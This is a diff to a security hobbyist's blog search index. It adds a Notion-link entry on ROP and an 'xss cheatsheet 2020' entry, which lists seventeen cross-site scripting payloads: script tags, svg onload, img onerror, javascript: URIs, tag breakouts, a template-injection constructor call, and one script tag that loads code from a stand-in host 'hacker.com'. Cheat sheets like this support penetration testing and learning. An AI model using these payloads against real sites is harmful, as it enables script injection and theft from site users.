@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ROP &amp; SSE Instruction</title>
+      <link href="2020/02/10/rop-instruction-200210/"/>
+      <url>2020/02/10/rop-instruction-200210/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>(<a href="https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659)[Open">https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659)[Open</a> Notion]</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwnable </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Pwn, ROP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>DIMICTF 2019 Write up</title>
       <link href="2020/02/06/dimictf-200206/"/>
       <url>2020/02/06/dimictf-200206/</url>
@@ -40,6 +65,31 @@
         <tags>
             
             <tag> Dockerfile, Docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss cheatsheet 2020</title>
+      <link href="2020/02/05/xsscheatsheet-200205/"/>
+      <url>2020/02/05/xsscheatsheet-200205/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;hacker.com/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>cilck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> data:text/html,<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> */alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>/*</span><br><span class="line"><span class="javascript"> <span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&#x27;alert(/xss/)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web, XSS, CheatSheet </tag>
             
         </tags>
       
